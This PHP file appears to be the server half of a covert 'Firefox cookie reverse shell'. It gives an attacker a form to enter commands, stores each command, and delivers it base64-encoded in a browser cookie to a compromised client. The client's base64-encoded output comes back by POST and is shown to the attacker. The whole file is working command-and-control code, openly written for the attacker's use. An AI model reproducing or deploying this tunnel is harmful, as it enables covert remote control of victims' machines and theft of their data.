<?php
require "boot.php";

$form_view=$_GET['input'];
$cmd=$_POST['cmd'];
$cmd_result=base64_decode($_POST['result']);

# if have command save it in txt
if($cmd) {
	$fp = fopen('last_cmd.txt', 'w');
	fwrite($fp, $cmd);
	fclose($fp);
}

# if enters in firefox_shell?input=1 / attacker use it to send commands and show results
if($form_view) {
	$form=' <form action="/firefox_shell/firefox_cmd_tunnel.php?input=1" method="post">
  			<fieldset>
    				<legend>Firefox cookie reverse shell:</legend>
    				Command:<br>
    				<input type="text" name="cmd" value="dir"><br>
    				<input type="submit" value="Submit">
  			</fieldset>
		</form> ';	
	print $form."<br>";
	$last_cmd=htmlentities(get_txt_content("last_result.txt"));
	if($last_cmd) {
		print "<code><pre>".$last_cmd ."</pre></code>";	
	}
	exit;
}


# if have command result save it in txt
if($cmd_result) {
	$fp2 = fopen('last_result.txt', 'w');
	fwrite($fp2, $cmd_result);
	fclose($fp2);
}


$last_command=base64_encode(get_txt_content("last_cmd.txt"));
setcookie("command", $last_command, time() + (86400 * 30), "/");



?>
